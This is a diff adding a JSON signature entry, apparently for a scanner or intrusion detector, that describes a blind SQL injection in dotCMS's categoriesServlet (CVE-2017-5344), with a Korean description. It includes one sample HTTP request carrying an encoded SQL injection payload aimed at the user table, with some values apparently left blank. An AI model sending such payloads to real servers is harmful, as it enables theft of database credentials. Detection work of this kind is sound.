@@ -1,0 +1,9 @@
+{
+	"Name": "dotCMS categoriesServlet Blind SQL Injection",
+	"Description": "- dotCMS 설치시 기본값인 categoriesServlet 에서 q 매개 변수에 대한 적절한 필터링이 존재하지 않아 발생\n- 해당 매개 변수에 특정 구문을 이용하여 공격\n- 공격 성공 시 Database 계정 정보 획득",
+	"References": ["CVE-2017-5344"],
+	"Samples": [
+		"GET /categoriesServlet?q=%5c%5c%27)+OR%2f%2a%2a%2f(SELECT(SUBSTRING((SELECT()FROM(.user_)LIMIT%2f%2a%2a%2f,1),,1)))LIKE+BINARY+%2f%2a%2a%2fORDER+BY+category.sort_order%23 HTTP/1.1"],
+	"Keywords": [],
+	"Signature": []
+}
